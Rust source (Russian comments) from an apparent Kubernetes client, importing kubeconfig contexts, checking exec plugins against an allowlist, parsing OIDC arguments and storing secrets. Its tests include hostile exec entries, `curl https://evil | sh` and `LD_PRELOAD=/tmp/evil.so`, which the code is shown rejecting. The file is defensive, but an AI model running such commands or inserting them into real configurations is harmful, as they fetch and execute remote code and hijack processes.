//! Импорт контекстов kubeconfig (спец. §5.5). Данные копируются в момент импорта: токены и
//! ключи — в keychain, CA, сертификат и строка запуска exec-плагина — в профиль; связи с файлом нет.

use std::path::{Path, PathBuf};

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use kube::config::{AuthInfo, Cluster, ExecConfig, ExecInteractiveMode, Kubeconfig};
use secrecy::ExposeSecret;
use serde::Serialize;

use crate::error::{AppError, AppResult, ErrorCode};
use crate::i18n::LocalizedText;
use crate::policy::PolicyStatus;
use crate::storage::profile::{
    AuthConfig, CaConfig, ConnectionProfile, DEFAULT_OIDC_CLIENT_ID, DEFAULT_OIDC_SCOPES,
    EXEC_API_V1, EXEC_API_V1BETA1, Environment, ExecAuth, ExecEnv, OidcAuth, ProxyConfig, REDACTED,
    is_valid_namespace, normalize_profile, pem_certificates, pem_has_private_key,
};

/// Поиск команды exec-плагина: имя из kubeconfig и каталог файла → абсолютный путь.
pub type ResolveCommand<'a> = &'a dyn Fn(&str, Option<&Path>) -> Option<PathBuf>;

/// Как подключение будет входить после импорта.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum ImportAuth {
    Token,
    ClientCert,
    /// Учётных данных в файле нет (или логин и пароль): вход через браузер.
    Browser,
    /// Exec-плагин из списка разрешённых (спец. §5.2).
    Exec,
    /// Exec-плагин входа через OIDC (`kubectl oidc-login`, `kubelogin`): по умолчанию вход через
    /// браузер в OIDC-провайдер (спека O5 §5.4), exec-плагин — второй вариант.
    Oidc,
}

/// Вход через OIDC из аргументов exec-плагина. Секрета клиента здесь нет — только признак:
/// предпросмотр уходит в webview, а применение берёт секрет из файла заново.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct OidcImport {
    #[serde(flatten)]
    pub auth: OidcAuth,
    pub has_client_secret: bool,
    /// CA издателя из `--certificate-authority` не прочитан: вход через OIDC остаётся, но без CA.
    pub issuer_ca_warning: Option<LocalizedText>,
}

/// Вход через OIDC из аргументов kubelogin: издатель, клиент и scopes, секрет клиента и источник
/// CA издателя (файл читает предпросмотр). Секрет не печатается: `Debug` нет.
#[derive(Clone)]
pub struct OidcLogin {
    pub auth: OidcAuth,
    pub client_secret: Option<String>,
    pub issuer_ca: Option<IssuerCa>,
}

/// CA издателя в аргументах kubelogin.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum IssuerCa {
    /// `--certificate-authority-data=<base64>`.
    Data(String),
    /// `--certificate-authority=<путь>`; относительный — от каталога kubeconfig.
    File(String),
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KubeContext {
    pub name: String,
    pub cluster: String,
    pub server: String,
    pub user: String,
    pub namespace: Option<String>,
    pub auth: ImportAuth,
    pub insecure: bool,
    pub current: bool,
    /// Строка запуска exec-плагина с абсолютным путём к команде — человек подтверждает её
    /// при импорте.
    pub exec: Option<ExecAuth>,
    /// Отпечаток строки запуска (`auth::exec::fingerprint`), как её сохранит импорт, — до того,
    /// как webview скроет секреты. Человек подтверждает именно эту строку: применение
    /// принимает отпечаток, а не имя контекста.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub launch_fingerprint: Option<String>,
    /// Вход через OIDC (`auth == Oidc`).
    pub oidc: Option<OidcImport>,
    /// Почему у контекста с входом через OIDC нельзя выбрать exec-плагин; `None` — можно.
    pub exec_unsupported: Option<LocalizedText>,
    /// Почему контекст нельзя импортировать; `None` — можно.
    pub unsupported: Option<LocalizedText>,
    /// Подключение с тем же адресом и именем: импорт обновит его.
    pub existing_id: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KubeconfigPreview {
    pub path: String,
    pub contexts: Vec<KubeContext>,
}

/// Подключение из контекста и его секреты.
#[derive(Clone)]
pub struct ImportedContext {
    pub profile: ConnectionProfile,
    pub token: Option<String>,
    pub client_key: Option<String>,
    /// Секрет клиента OIDC (`--oidc-client-secret`).
    pub oidc_client_secret: Option<String>,
}

/// Токен, приватный ключ и секрет клиента не печатаются: структура может попасть в лог,
/// `assert!` или сообщение об ошибке. Профиль секретов не содержит и печатается целиком.
impl std::fmt::Debug for ImportedContext {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let hide = |secret: &Option<String>| secret.as_ref().map(|_| REDACTED);
        f.debug_struct("ImportedContext")
            .field("profile", &self.profile)
            .field("token", &hide(&self.token))
            .field("client_key", &hide(&self.client_key))
            .field("oidc_client_secret", &hide(&self.oidc_client_secret))
            .finish()
    }
}

/// Файл по умолчанию: первый путь из `$KUBECONFIG`, иначе `~/.kube/config`.
pub fn default_path(env: crate::k8s::config::EnvLookup, home: Option<PathBuf>) -> Option<PathBuf> {
    if let Some(list) = env("KUBECONFIG").filter(|v| !v.trim().is_empty()) {
        return std::env::split_paths(&list).next();
    }
    home.map(|h| h.join(".kube").join("config"))
}

pub fn read(path: &Path) -> AppResult<Kubeconfig> {
    Kubeconfig::read_from(path).map_err(|e| {
        app_err!(
            ErrorCode::InvalidInput,
            "errors.kubeconfig.unreadable",
            "Cannot read kubeconfig {{path}}: {{error}}",
            path = path.display(),
            error = e
        )
    })
}

fn cluster<'a>(kc: &'a Kubeconfig, name: &str) -> Option<&'a Cluster> {
    kc.clusters
        .iter()
        .find(|c| c.name == name)
        .and_then(|c| c.cluster.as_ref())
}

fn user<'a>(kc: &'a Kubeconfig, name: &str) -> Option<&'a AuthInfo> {
    kc.auth_infos
        .iter()
        .find(|u| u.name == name)
        .and_then(|u| u.auth_info.as_ref())
}

/// Exec-плагин из kubeconfig: команда из списка разрешённых, найденная по абсолютному пути, без
/// запрещённых переменных окружения.
fn exec_auth(
    exec: &ExecConfig,
    base: Option<&Path>,
    resolve: ResolveCommand,
) -> Result<ExecAuth, LocalizedText> {
    if exec.interactive_mode == Some(ExecInteractiveMode::Always) {
        return Err(ltext!(
            "errors.kubeconfig.execInteractive",
            "The exec plugin needs a terminal (interactiveMode: Always) — not supported"
        ));
    }
    let command = exec.command.clone().unwrap_or_default();
    let args = exec.args.clone().unwrap_or_default();
    crate::auth::exec::check_allowed(&command, &args)?;
    let env: Vec<ExecEnv> = exec
        .env
        .iter()
        .flatten()
        .filter_map(|m| {
            Some(ExecEnv {
                name: m.get("name")?.clone(),
                value: m.get("value").cloned().unwrap_or_default(),
            })
        })
        .collect();
    crate::auth::exec::check_env(&env)?;
    let api_version = exec
        .api_version
        .clone()
        .unwrap_or_else(|| EXEC_API_V1.to_string());
    if api_version != EXEC_API_V1 && api_version != EXEC_API_V1BETA1 {
        return Err(ltext!(
            "errors.exec.badApiVersion",
            "Unsupported exec plugin API version “{{version}}”: use {{expected}}",
            version = api_version,
            expected = EXEC_API_V1
        ));
    }
    let path = resolve(&command, base).ok_or_else(|| {
        ltext!(
            "errors.kubeconfig.execNotFound",
            "Command “{{command}}” is not found in PATH or the standard folders — install it or specify the full path in kubeconfig",
            command = command
        )
    })?;
    Ok(ExecAuth {
        command: path.display().to_string(),
        args,
        env,
        api_version,
        provide_cluster_info: exec.provide_cluster_info,
        approved: None,
    })
}

/// Вход через OIDC из exec-плагина int128/kubelogin (`kubelogin get-token …` или
/// `kubectl oidc-login get-token …`) с `--oidc-issuer-url` (спека O5 §5.4): издатель, client id
/// (нет — `dapp`), scopes (`openid` и `--oidc-extra-scope`; нет ни одного — scopes DropApp) и
/// секрет клиента, CA издателя (`--certificate-authority-data` важнее `--certificate-authority`,
/// как `*-data` в kubeconfig). Ключ и значение — `--k=v` или `--k v`, у повторённого ключа —
/// последнее значение. Azure kubelogin (`--login`, `--server-id`) — не вход через OIDC.
pub fn oidc_login(command: &str, args: &[String]) -> Option<OidcLogin> {
    let start = match crate::auth::exec::command_name(command).as_str() {
        "kubelogin" => args.iter().position(|a| a == "get-token")? + 1,
        "kubectl" if args.len() >= 2 && args[0] == "oidc-login" && args[1] == "get-token" => 2,
        _ => return None,
    };
    let mut values: Vec<(&str, &str)> = Vec::new();
    let mut rest = args[start..].iter();
    while let Some(a) = rest.next() {
        let Some(option) = a.strip_prefix("--") else {
            continue;
        };
        let (key, inline) = match option.split_once('=') {
            Some((k, v)) => (k, Some(v)),
            None => (option, None),
        };
        if matches!(key, "login" | "server-id") {
            return None;
        }
        if !matches!(
            key,
            "oidc-issuer-url"
                | "oidc-client-id"
                | "oidc-client-secret"
                | "oidc-extra-scope"
                | "certificate-authority"
                | "certificate-authority-data"
        ) {
            continue;
        }
        match inline.or_else(|| rest.next().map(String::as_str)) {
            Some(value) => values.push((key, value.trim())),
            None => break,
        }
    }
    let last = |key: &str| {
        values
            .iter()
            .rev()
            .find(|(k, v)| *k == key && !v.is_empty())
            .map(|(_, v)| v.to_string())
    };
    let issuer_url = last("oidc-issuer-url")?;
    let extra: Vec<String> = values
        .iter()
        .filter(|(k, _)| *k == "oidc-extra-scope")
        .flat_map(|(_, v)| v.split(','))
        .map(str::trim)
        .filter(|s| !s.is_empty() && *s != "openid")
        .map(String::from)
        .collect();
    let scopes = if extra.is_empty() {
        DEFAULT_OIDC_SCOPES.map(String::from).to_vec()
    } else {
        std::iter::once("openid".to_string()).chain(extra).collect()
    };
    let auth = OidcAuth {
        issuer_url,
        client_id: last("oidc-client-id").unwrap_or_else(|| DEFAULT_OIDC_CLIENT_ID.to_string()),
        scopes,
        issuer_ca_pem: None,
    };
    let issuer_ca = last("certificate-authority-data")
        .map(IssuerCa::Data)
        .or_else(|| last("certificate-authority").map(IssuerCa::File));
    Some(OidcLogin {
        auth,
        client_secret: last("oidc-client-secret"),
        issuer_ca,
    })
}

/// Предел размера файла CA издателя.
const MAX_ISSUER_CA_BYTES: u64 = 1024 * 1024;

/// Читает файл CA: только обычный файл не больше 1 МиБ.
fn read_ca_file(path: &Path) -> Result<String, String> {
    let meta = std::fs::metadata(path).map_err(|e| e.to_string())?;
    if !meta.is_file() {
        return Err("not a regular file".to_string());
    }
    if meta.len() > MAX_ISSUER_CA_BYTES {
        return Err("the file is larger than 1 MiB".to_string());
    }
    std::fs::read_to_string(path).map_err(|e| e.to_string())
}

/// PEM CA издателя: данные декодируются, файл читается (относительный путь — от каталога
/// kubeconfig `base`). Ошибка — предупреждение с путём (у данных — именем аргумента).
fn issuer_ca_pem(ca: &IssuerCa, base: Option<&Path>) -> Result<String, LocalizedText> {
    let (path, text) = match ca {
        IssuerCa::Data(data) => (
            "--certificate-authority-data".to_string(),
            STANDARD
                .decode(data.trim())
                .ok()
                .and_then(|b| String::from_utf8(b).ok())
                .ok_or_else(|| "not valid base64".to_string()),
        ),
        IssuerCa::File(file) => {
            let path = match base {
                Some(dir) if Path::new(file).is_relative() => dir.join(file),
                _ => PathBuf::from(file),
            };
            let text = read_ca_file(&path);
            (path.display().to_string(), text)
        }
    };
    text.and_then(|pem| {
        // Общий файл с приватным ключом в предпросмотр не попадает: ни ключ, ни его текст.
        if pem_has_private_key(&pem) {
            return Err("the file also contains a private key".to_string());
        }
        pem_certificates(&pem)
            .map(|_| pem)
            .map_err(|_| "not a PEM certificate".to_string())
    })
    .map_err(|error| {
        ltext!(
            "errors.kubeconfig.issuerCaUnreadable",
            "Cannot read the OIDC issuer CA {{path}}: {{error}} — the connection is imported without it; add it in the connection form",
            path = path,
            error = error
        )
    })
}

/// Вход через OIDC пользователя kubeconfig (его exec-плагин), если он есть.
fn oidc_of(u: Option<&AuthInfo>) -> Option<OidcLogin> {
    let exec = u?.exec.as_ref()?;
    oidc_login(
        exec.command.as_deref().unwrap_or_default(),
        exec.args.as_deref().unwrap_or_default(),
    )
}

/// Способ входа, строка запуска exec-плагина и причина, по которой контекст не импортируется.
fn classify(
    u: Option<&AuthInfo>,
    base: Option<&Path>,
    resolve: ResolveCommand,
) -> (ImportAuth, Option<ExecAuth>, Option<LocalizedText>) {
    let Some(u) = u else {
        return (ImportAuth::Browser, None, None);
    };
    if let Some(exec) = &u.exec {
        return match exec_auth(exec, base, resolve) {
            Ok(e) => (ImportAuth::Exec, Some(e), None),
            Err(reason) => (ImportAuth::Exec, None, Some(reason)),
        };
    }
    if let Some(p) = &u.auth_provider {
        return (
            ImportAuth::Browser,
            None,
            Some(ltext!(
                "errors.kubeconfig.authProvider",
                "Authentication provider “{{name}}” is outdated and not supported — use an exec plugin",
                name = p.name
            )),
        );
    }
    if u.token.is_some() || u.token_file.is_some() {
        return (ImportAuth::Token, None, None);
    }
    if u.client_certificate.is_some() || u.client_certificate_data.is_some() {
        return (ImportAuth::ClientCert, None, None);
    }
    (ImportAuth::Browser, None, None)
}

/// Контексты файла для предпросмотра. `existing` — уже сохранённые подключения, `resolve` ищет
/// команды exec-плагинов.
pub fn preview(
    kc: &Kubeconfig,
    path: &Path,
    existing: &[ConnectionProfile],
    policy: &PolicyStatus,
    resolve: ResolveCommand,
) -> KubeconfigPreview {
    let contexts = kc
        .contexts
        .iter()
        .map(|nc| {
            let ctx = nc.context.clone().unwrap_or_default();
            let user_name = ctx.user.clone().unwrap_or_default();
            let cl = cluster(kc, &ctx.cluster);
            let server = cl
                .and_then(|c| c.server.clone())
                .unwrap_or_default()
                .trim_end_matches('/')
                .to_string();
            let insecure = cl.and_then(|c| c.insecure_skip_tls_verify).unwrap_or(false);
            let u = user(kc, &user_name);
            let (mut auth, mut exec, mut unsupported) = classify(u, path.parent(), resolve);
            let oidc = oidc_of(u).map(|login| {
                let mut auth = login.auth;
                let mut issuer_ca_warning = None;
                match login.issuer_ca.map(|ca| issuer_ca_pem(&ca, path.parent())) {
                    Some(Ok(pem)) => auth.issuer_ca_pem = Some(pem),
                    Some(Err(warning)) => issuer_ca_warning = Some(warning),
                    None => {}
                }
                OidcImport {
                    auth,
                    has_client_secret: login.client_secret.is_some(),
                    issuer_ca_warning,
                }
            });
            // Exec-плагин входа через OIDC — второй вариант: его отказ (команды нет на машине,
            // неизвестный `apiVersion`, запрет политикой) входу через OIDC не мешает.
            let mut exec_unsupported = None;
            if oidc.is_some() {
                auth = ImportAuth::Oidc;
                exec_unsupported = unsupported.take();
                if exec_unsupported.is_none() && !policy.allow_exec_auth {
                    exec_unsupported = Some(ltext!(
                        "errors.connections.execForbidden",
                        "Connections with exec plugins are forbidden by your organization"
                    ));
                    exec = None;
                }
            }
            if cl.is_none() {
                unsupported = Some(ltext!(
                    "errors.kubeconfig.noCluster",
                    "The context refers to a missing cluster “{{name}}”",
                    name = ctx.cluster
                ));
            } else if insecure && !policy.allow_insecure_tls {
                unsupported = Some(ltext!(
                    "errors.connections.insecureForbidden",
                    "Connections without TLS certificate verification are forbidden by your organization"
                ));
            } else if auth == ImportAuth::Exec && !policy.allow_exec_auth {
                unsupported = Some(ltext!(
                    "errors.connections.execForbidden",
                    "Connections with exec plugins are forbidden by your organization"
                ));
            }
            KubeContext {
                existing_id: existing
                    .iter()
                    .find(|p| p.name == nc.name && p.api_url == server)
                    .map(|p| p.id.clone()),
                name: nc.name.clone(),
                cluster: ctx.cluster.clone(),
                server,
                user: user_name,
                namespace: ctx.namespace.clone(),
                auth,
                insecure,
                current: kc.current_context.as_deref() == Some(nc.name.as_str()),
                launch_fingerprint: exec.as_ref().map(crate::auth::exec::fingerprint),
                exec,
                oidc,
                exec_unsupported,
                unsupported,
            }
        })
        .collect();
    KubeconfigPreview {
        path: path.display().to_string(),
        contexts,
    }
}

fn file_text(path: &str) -> AppResult<String> {
    std::fs::read_to_string(path).map_err(|e| {
        app_err!(
            ErrorCode::InvalidInput,
            "errors.kubeconfig.fileUnreadable",
            "Cannot read {{path}} referenced by kubeconfig: {{error}}",
            path = path,
            error = e
        )
    })
}

fn decoded(data: &str) -> AppResult<String> {
    STANDARD
        .decode(data.trim())
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
        .ok_or_else(|| {
            app_err!(
                ErrorCode::InvalidInput,
                "errors.kubeconfig.badBase64",
                "Certificate or key data in kubeconfig is not valid base64"
            )
        })
}

/// Данные из `*-data` (base64) или из файла по пути.
fn data_or_file(data: Option<&str>, path: Option<&str>) -> AppResult<Option<String>> {
    match (data, path) {
        (Some(d), _) => decoded(d).map(Some),
        (None, Some(p)) => file_text(p).map(Some),
        (None, None) => Ok(None),
    }
}

/// Предпросмотр не соответствует файлу (устарел или чужой): внутренняя ошибка вместо паники.
fn mismatch(name: &str, what: &str) -> AppError {
    AppError::internal_with(format!(
        "kubeconfig preview of context {name} is stale: {what}"
    ))
}

/// Контекст с входом через OIDC, для которого выбран exec-плагин: импортируется как exec. Строки
/// запуска нет — ошибка с её причиной.
pub fn with_exec(ctx: &KubeContext) -> AppResult<KubeContext> {
    if ctx.auth != ImportAuth::Oidc {
        return Ok(ctx.clone());
    }
    if ctx.exec.is_none() {
        return Err(match &ctx.exec_unsupported {
            Some(reason) => AppError::localized(ErrorCode::InvalidInput, reason.clone()),
            None => mismatch(&ctx.name, "OIDC without a launch line"),
        });
    }
    Ok(KubeContext {
        auth: ImportAuth::Exec,
        ..ctx.clone()
    })
}

/// Подключение из контекста `name`. Ошибка — если контекст не поддерживается или данные
/// не читаются.
pub fn import_context(
    kc: &Kubeconfig,
    name: &str,
    preview: &KubeContext,
) -> AppResult<ImportedContext> {
    if let Some(reason) = &preview.unsupported {
        return Err(AppError::localized(ErrorCode::InvalidInput, reason.clone()));
    }
    let nc = kc.contexts.iter().find(|c| c.name == name).ok_or_else(|| {
        app_err!(
            ErrorCode::NotFound,
            "errors.kubeconfig.noContext",
            "Context “{{name}}” not found in kubeconfig",
            name = name
        )
    })?;
    let ctx = nc.context.clone().unwrap_or_default();
    let cl = cluster(kc, &ctx.cluster).cloned().unwrap_or_default();
    let u = ctx.user.as_deref().and_then(|n| user(kc, n));

    let ca = if cl.insecure_skip_tls_verify.unwrap_or(false) {
        CaConfig::Insecure
    } else {
        match data_or_file(
            cl.certificate_authority_data.as_deref(),
            cl.certificate_authority.as_deref(),
        )? {
            Some(pem) => {
                pem_certificates(&pem).map_err(|_| {
                    app_err!(
                        ErrorCode::InvalidInput,
                        "errors.connections.caPemInvalid",
                        "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
                    )
                })?;
                CaConfig::Pem { pem }
            }
            None => CaConfig::System,
        }
    };
    let mut token = None;
    let mut client_key = None;
    let mut oidc_client_secret = None;
    let auth = match preview.auth {
        ImportAuth::Token => {
            let u = u.ok_or_else(|| mismatch(name, "token without a user"))?;
            token = Some(match (&u.token, &u.token_file) {
                (Some(t), _) => t.expose_secret().trim().to_string(),
                (None, Some(f)) => file_text(f)?.trim().to_string(),
                (None, None) => return Err(mismatch(name, "token without a token or a file")),
            });
            AuthConfig::Token
        }
        ImportAuth::ClientCert => {
            let u = u.ok_or_else(|| mismatch(name, "certificate without a user"))?;
            let cert = data_or_file(
                u.client_certificate_data.as_deref(),
                u.client_certificate.as_deref(),
            )?
            .ok_or_else(|| mismatch(name, "certificate without a client certificate"))?;
            client_key = data_or_file(
                u.client_key_data.as_ref().map(|k| k.expose_secret()),
                u.client_key.as_deref(),
            )?;
            AuthConfig::ClientCert {
                certificate_pem: cert,
            }
        }
        ImportAuth::Browser => AuthConfig::Browser,
        ImportAuth::Exec => AuthConfig::Exec(
            preview
                .exec
                .clone()
                .ok_or_else(|| mismatch(name, "exec without a launch line"))?,
        ),
        ImportAuth::Oidc => {
            let login =
                oidc_of(u).ok_or_else(|| mismatch(name, "OIDC without kubelogin arguments"))?;
            oidc_client_secret = login.client_secret;
            // CA издателя прочитан предпросмотром: у `import_context` нет пути к kubeconfig.
            AuthConfig::Oidc(OidcAuth {
                issuer_ca_pem: preview
                    .oidc
                    .as_ref()
                    .and_then(|o| o.auth.issuer_ca_pem.clone()),
                ..login.auth
            })
        }
    };
    let mut profile = ConnectionProfile {
        id: preview
            .existing_id
            .clone()
            .unwrap_or_else(|| uuid::Uuid::new_v4().to_string()),
        name: nc.name.clone(),
        color: "#3b82f6".into(),
        environment: Environment::Dev,
        read_only: false,
        api_url: cl.server.clone().unwrap_or_default(),
        auth,
        ca,
        tls_server_name: cl.tls_server_name.clone(),
        proxy: match cl.proxy_url.as_deref().map(str::trim) {
            Some(u) if !u.is_empty() => ProxyConfig::Url { url: u.to_string() },
            _ => ProxyConfig::System,
        },
        favorite_namespaces: ctx
            .namespace
            .clone()
            .filter(|n| is_valid_namespace(n))
            .into_iter()
            .collect(),
        manual_namespaces: Vec::new(),
        request_timeout_ms: 30_000,
        connect_timeout_ms: 10_000,
        folder_id: None,
        order: 0,
        llm_access: Default::default(),
        llm_namespaces: None,
        llm_mask_fields: None,
        metrics: Default::default(),
        extra: Default::default(),
    };
    normalize_profile(&mut profile);
    crate::storage::profile::validate_profile(&profile)?;
    Ok(ImportedContext {
        profile,
        token,
        client_key,
        oidc_client_secret,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::profile::{TEST_CERT_PEM, sample_profile};

    fn kc(yaml: &str) -> Kubeconfig {
        Kubeconfig::from_yaml(yaml).unwrap()
    }

    /// Команды exec-плагинов «на этой машине»: только `kubelogin` и `aws`.
    fn installed(cmd: &str, _base: Option<&Path>) -> Option<PathBuf> {
        matches!(cmd, "kubelogin" | "aws").then(|| std::env::temp_dir().join("bin").join(cmd))
    }

    fn open() -> PolicyStatus {
        PolicyStatus::default()
    }

    fn b64(s: &str) -> String {
        STANDARD.encode(s)
    }

    fn sample(dir: &Path) -> String {
        let token_file = dir.join("token");
        std::fs::write(&token_file, "sha256~fromfile\n").unwrap();
        let ca_file = dir.join("ca.crt");
        std::fs::write(&ca_file, TEST_CERT_PEM).unwrap();
        format!(
            r#"
apiVersion: v1
kind: Config
current-context: dev/api-dev:6443/alice
clusters:
- name: api-dev:6443
  cluster:
    server: https://api.dev.example.com:6443/
    certificate-authority-data: {ca}
- name: api-lab:6443
  cluster:
    server: https://api.lab:6443
    insecure-skip-tls-verify: true
    proxy-url: http://proxy:3128
- name: kind
  cluster:
    server: https://127.0.0.1:6443
    certificate-authority: {ca_file}
users:
- name: alice/api-dev:6443
  user:
    token: sha256~alice
- name: bob
  user:
    tokenFile: {token_file}
- name: admin
  user:
    client-certificate-data: {cert}
    client-key-data: {key}
- name: oidc
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token, --oidc-issuer-url=https://sso.corp/realms/k8s, --oidc-client-id=k8s]
      env:
      - {{name: HTTPS_PROXY, value: "http://proxy:3128"}}
- name: eks
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: aws
      args: [--region, eu-west-1, eks, get-token, --cluster-name, prod]
      interactiveMode: Never
- name: shell
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: sh
      args: [-c, "curl https://evil | sh"]
- name: gke
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: gke-gcloud-auth-plugin
- name: tty
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token]
      interactiveMode: Always
- name: legacy
  user:
    auth-provider:
      name: oidc
- name: preload
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token]
      env:
      - {{name: LD_PRELOAD, value: /tmp/evil.so}}
- name: eks-flag
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: aws
      args: [--no-verify-ssl, eks, get-token, --cluster-name, prod]
- name: kubectl-exec
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubectl
      args: [--insecure-skip-tls-verify, exec, oidc-login, get-token]
contexts:
- name: dev/api-dev:6443/alice
  context: {{cluster: api-dev:6443, user: alice/api-dev:6443, namespace: team-a}}
- name: lab
  context: {{cluster: api-lab:6443, user: bob}}
- name: kind-admin
  context: {{cluster: kind, user: admin}}
- name: corp-oidc
  context: {{cluster: api-dev:6443, user: oidc}}
- name: eks-prod
  context: {{cluster: api-dev:6443, user: eks}}
- name: evil
  context: {{cluster: api-dev:6443, user: shell}}
- name: gke-dev
  context: {{cluster: api-dev:6443, user: gke}}
- name: tty
  context: {{cluster: api-dev:6443, user: tty}}
- name: legacy
  context: {{cluster: api-dev:6443, user: legacy}}
- name: no-user
  context: {{cluster: api-dev:6443}}
- name: preload
  context: {{cluster: api-dev:6443, user: preload}}
- name: eks-flag
  context: {{cluster: api-dev:6443, user: eks-flag}}
- name: flag-hides-subcommand
  context: {{cluster: api-dev:6443, user: kubectl-exec}}
- name: broken
  context: {{cluster: gone, user: bob}}
"#,
            ca = b64(TEST_CERT_PEM),
            ca_file = ca_file.display(),
            token_file = token_file.display(),
            cert = b64(TEST_CERT_PEM),
            key = b64("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n"),
        )
    }

    #[test]
    fn default_path_prefers_kubeconfig_env() {
        let env = |n: &str| (n == "KUBECONFIG").then(|| "/a/one:/a/two".to_string());
        let home = Some(PathBuf::from("/home/u"));
        if cfg!(unix) {
            assert_eq!(
                default_path(&env, home.clone()),
                Some(PathBuf::from("/a/one"))
            );
        }
        assert_eq!(
            default_path(&|_| None, home),
            Some(PathBuf::from("/home/u/.kube/config"))
        );
    }

    #[test]
    fn preview_classifies_contexts() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let mut existing = sample_profile("old");
        existing.name = "lab".into();
        existing.api_url = "https://api.lab:6443".into();
        let p = preview(&k, dir.path(), &[existing], &open(), &installed);
        let by = |n: &str| p.contexts.iter().find(|c| c.name == n).unwrap().clone();
        let dev = by("dev/api-dev:6443/alice");
        assert_eq!(dev.auth, ImportAuth::Token);
        assert!(dev.current);
        assert_eq!(dev.server, "https://api.dev.example.com:6443");
        assert_eq!(dev.namespace.as_deref(), Some("team-a"));
        assert!(dev.unsupported.is_none());
        let lab = by("lab");
        assert!(lab.insecure);
        assert_eq!(lab.existing_id.as_deref(), Some("old"));
        assert_eq!(by("kind-admin").auth, ImportAuth::ClientCert);
        let oidc = by("corp-oidc");
        assert_eq!(
            (
                oidc.auth,
                oidc.unsupported.clone(),
                oidc.exec_unsupported.clone()
            ),
            (ImportAuth::Oidc, None, None),
            "OIDC по умолчанию, exec-плагин — второй вариант"
        );
        assert_eq!(oidc.oidc.as_ref().unwrap().auth.client_id, "k8s");
        let exec = oidc.exec.unwrap();
        assert_eq!(
            exec.command,
            installed("kubelogin", None).unwrap().display().to_string()
        );
        assert_eq!(exec.args[0], "get-token");
        assert_eq!(exec.env[0].name, "HTTPS_PROXY");
        assert_eq!(exec.approved, None, "подтверждает человек в диалоге");
        assert_eq!(
            oidc.launch_fingerprint.as_deref(),
            Some(crate::auth::exec::fingerprint(&exec).as_str())
        );
        assert_eq!(dev.launch_fingerprint, None);
        let eks = by("eks-prod").exec.unwrap();
        assert_eq!(eks.api_version, "client.authentication.k8s.io/v1beta1");
        for (name, key) in [
            ("evil", "errors.exec.notAllowed"),
            ("gke-dev", "errors.kubeconfig.execNotFound"),
            ("tty", "errors.kubeconfig.execInteractive"),
            ("legacy", "errors.kubeconfig.authProvider"),
            ("preload", "errors.exec.envForbidden"),
            ("flag-hides-subcommand", "errors.exec.optionBeforePlugin"),
        ] {
            let c = by(name);
            assert_eq!(c.unsupported.unwrap().key, key, "{name}");
            assert_eq!(c.exec, None, "{name}: строки запуска нет");
        }
        assert_eq!(
            by("preload").unsupported.unwrap().params["name"],
            "LD_PRELOAD"
        );
        let flag = by("eks-flag");
        assert_eq!(
            flag.unsupported, None,
            "флаг без значения перед подкомандой"
        );
        assert_eq!(flag.exec.unwrap().args[0], "--no-verify-ssl");
        assert_eq!(by("no-user").auth, ImportAuth::Browser);
        assert_eq!(
            by("broken").unsupported.unwrap().key,
            "errors.kubeconfig.noCluster"
        );

        let policy = PolicyStatus {
            allow_insecure_tls: false,
            allow_exec_auth: false,
            ..PolicyStatus::default()
        };
        let strict = preview(&k, dir.path(), &[], &policy, &installed);
        let key = |n: &str| {
            let c = strict.contexts.iter().find(|c| c.name == n).unwrap();
            c.unsupported.as_ref().unwrap().key.clone()
        };
        assert_eq!(key("lab"), "errors.connections.insecureForbidden");
        assert_eq!(key("eks-prod"), "errors.connections.execForbidden");
        // Запрет exec-плагинов не мешает входу через OIDC: пропадает только второй вариант.
        let oidc = strict
            .contexts
            .iter()
            .find(|c| c.name == "corp-oidc")
            .unwrap();
        assert_eq!(
            (oidc.auth, oidc.unsupported.clone()),
            (ImportAuth::Oidc, None)
        );
        assert_eq!(
            oidc.exec_unsupported.as_ref().unwrap().key,
            "errors.connections.execForbidden"
        );
        assert_eq!(
            (oidc.exec.clone(), oidc.launch_fingerprint.clone()),
            (None, None)
        );
    }

    #[test]
    fn import_copies_data_and_secrets() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let p = preview(&k, dir.path(), &[], &open(), &installed);
        let get = |n: &str| {
            let c = p.contexts.iter().find(|c| c.name == n).unwrap();
            import_context(&k, n, c)
        };

        let dev = get("dev/api-dev:6443/alice").unwrap();
        assert_eq!(dev.profile.api_url, "https://api.dev.example.com:6443");
        assert_eq!(dev.profile.auth, AuthConfig::Token);
        assert_eq!(
            dev.profile.ca,
            CaConfig::Pem {
                pem: TEST_CERT_PEM.into()
            }
        );
        assert_eq!(dev.profile.favorite_namespaces, vec!["team-a"]);
        assert_eq!(dev.profile.environment, Environment::Dev);
        assert_eq!(dev.token.as_deref(), Some("sha256~alice"));
        assert!(dev.client_key.is_none());

        let lab = get("lab").unwrap();
        assert_eq!(lab.profile.ca, CaConfig::Insecure);
        assert_eq!(
            lab.profile.proxy,
            ProxyConfig::Url {
                url: "http://proxy:3128".into()
            }
        );
        assert_eq!(lab.token.as_deref(), Some("sha256~fromfile"));

        let kind = get("kind-admin").unwrap();
